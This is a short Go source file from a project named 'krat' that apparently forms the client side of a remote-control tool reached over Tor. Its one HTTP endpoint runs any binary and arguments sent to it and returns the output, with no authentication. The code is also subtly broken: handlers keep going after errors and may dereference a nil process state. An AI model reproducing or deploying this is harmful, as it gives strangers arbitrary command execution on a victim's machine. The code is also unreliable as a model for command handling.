package client

import (
	"os/exec"

	"github.com/gin-gonic/gin"
	"github.com/humbertovnavarro/krat/pkg/tor_engine"
)

func router(e *tor_engine.TorEngine) *gin.Engine {
	r := gin.Default()
	r.POST("/v1/command", CommandHandler)
	return r
}

type Command struct {
	Binary    string   `json:"binary,omitempty"`
	Arguments []string `json:"arguments"`
}

func CommandHandler(c *gin.Context) {
	command := &Command{}
	err := c.BindJSON(command)
	if err != nil {
		c.AbortWithStatusJSON(400, gin.H{
			"error": "binary must not be empty",
		})
	}
	cmd := exec.Command(command.Binary, command.Arguments...)
	stdout, err := cmd.Output()
	if err != nil {
		c.AbortWithStatusJSON(500, gin.H{
			"error":    "error while running command",
			"exitCode": cmd.ProcessState.ExitCode(),
			"stdout":   stdout,
		})
	}
	c.AbortWithStatusJSON(200, gin.H{
		"exitCode": cmd.ProcessState.ExitCode(),
		"stdout":   stdout,
	})
}
